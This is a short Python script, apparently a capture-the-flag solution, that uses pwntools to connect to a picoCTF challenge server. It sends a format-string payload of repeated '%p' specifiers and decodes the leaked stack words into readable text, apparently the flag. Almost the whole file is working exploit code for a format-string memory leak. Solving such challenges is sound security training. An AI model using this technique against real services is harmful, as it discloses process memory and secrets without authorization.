from pwn import *

def main():

    conn = remote('mimas.picoctf.net', 60079)

    response = conn.recvline()
    print(response.decode())
    
    conn.sendline(b'%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p') 

    response = conn.recvline()
    response = response.decode().replace('(nil)', '').split('0x')
    print(response)
    for char in response:
        try:
            print(bytes.fromhex(char).decode()[::-1], end='')
        except:
            pass

    print(f'response: {response}')
    
    conn.interactive()

if __name__ == "__main__":
    main()